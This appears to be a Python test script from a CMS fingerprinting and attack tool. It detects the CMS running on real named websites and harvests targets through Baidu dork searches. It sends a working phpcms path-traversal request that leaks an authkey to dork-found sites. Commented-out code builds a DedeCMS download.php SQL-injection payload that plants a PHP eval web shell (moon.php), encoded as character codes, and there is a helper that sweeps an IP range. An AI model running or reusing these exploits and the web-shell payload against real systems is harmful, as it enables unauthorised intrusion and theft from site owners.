# coding=utf-8

from PluginManager import PluginManager
from PluginManager import Model_CMS
from Crawler import Crawler
import pytesseract
from PIL import Image
from lxml import etree
import IPy

import requests

# load plugins
PluginManager.LoadAllPlugin()
plugins = Model_CMS.GetPluginObject()

'''
url test, 主要验证下别人的指纹哪些能够访问到，作为自己识别指纹的参考
'''


def url_test():
    target = "http://www.discuz.net/"
    file = open("fingerprint")
    import requests
    for line in file:
        url = target + line
        # print(url.strip())
        res = requests.get(url.strip())
        print("[" + str(res.status_code) + "]" + line.strip())
    file.close()


'''
单个url测试
'''


def single_test():
    # target = "http://www.wellidc.net" #phpcms
    target = "http://www.microeagle.cn"  # dedecms
    # target = "http://www.dstex.cn/" #ecshop
    # target = "http://bbs.heilanhome.com/" #discuz
    # target = "https://zhidao.baidu.com/"#

    try:
        requests.get(target)
    except:
        print "[HTTPConnectionError] " + target
        exit(0)

    for plugin in plugins:
        detect_res = plugin.detect(target)
        if detect_res:
            print(target + " : " + plugin.name)


'''
爬虫自动化采集测试
'''


def crawler_multi_test():
    keyword = "inurl:index.php?m=content&c="
    url_list = Crawler.baidu_search(keyword=keyword, page=2)
    for target in url_list:
        for plugin in plugins:
            if plugin.detect(target):
                print(target + " : " + plugin.name)
                if plugin.name == "phpcms":
                    try:
                        s = requests.get(target + "api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key"
                                              "=authkey&cachefile=..%5C..%5C..%5Cphpsso_server%5Ccaches"
                                              "%5Ccaches_admin%5Ccaches_data%5Capplist&path=admin").text
                    except:
                        continue
                    if "aaaaa" in s:
                        print(s)


def testocr():
    image = Image.open("cap.png")
    # image.show() #打开图片1.jpg
    tessdata_dir_config = '--tessdata-dir ./'
    text = pytesseract.image_to_string(image, lang='fra', config=tessdata_dir_config)  # 使用简体中文解析图片
    print(text)

def ip2domain(ip):
    s = requests.get("https://dns.aizhan.com/%s/"%ip)
    dom = etree.HTML(s.content)
    temp = dom.xpath("//td[@class='domain']/a")
    if len(temp)>0:
        print(ip, ":", temp[0].text)
    else:
        print(ip, ":", "no result")



if __name__ == '__main__':
    # url_test()
    single_test()
    #crawler_multi_test()
    # Crawler.zoomeye_search("test")
    # testocr()

    # s0 = "99 102 103 95 100 98 112 114 101 102 105 120"
    # s = "109 121 97 100 96 32 83 69 84 32 96 110 111 114 109 98 111 100 121 96 32 61 32 39 60 63 112 104 112 32 102 105 108 101 95 112 117 116 95 99 111 110 116 101 110 116 115 40 39 39 109 111 111 110 46 112 104 112 39 39 44 39 39 60 63 112 104 112 32 101 118 97 108 40 36 95 80 79 83 84 91 120 93 41 59 101 99 104 111 32 109 79 111 110 59 63 62 39 39 41 59 63 62 39 32 87 72 69 82 69 32 96 97 105 100 96 32 61 49 57 32 35"
    # s = s.split(" ")
    # str = ""
    # for c in s:
    #     # print c
    #     str += chr(int(c))
    #     # print chr(int(c))
    # print "[" + str + "]"

    # str_arrs2_prefix = "&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39"
    # str_arrs2_filename = "xxx.php"
    # str_arrs2_middle = "&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39"
    # str_arrs2_filecontent = "<?php eval($_POST[x]);echo mOon;?>'');?>"
    # str_arrs2_inject = "' WHERE aid ="
    # str_arrs2_aid = "19"
    # str_arrs2_end = "&arrs2[]=32&arrs2[]=35"

    # str_arrs1 = "/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120"
    # str_arrs2_origin = "myad` SET `normbody` = '<?php file_put_contents(''moon.php'',''<?php eval($_POST[x]);echo mOon;?>'');?>' WHERE `aid` =19 #"
    #
    # str_arrs2_trans = ""
    # for c in str_arrs2_origin:
    #     current = "&arrs2[]=" + str(ord(c))
    #     str_arrs2_trans += current
    # print str_arrs1 + str_arrs2_trans

    # ip = IPy.IP('123.56.0.0/16')
    # for x in ip:
    #     ip2domain(x.__str__())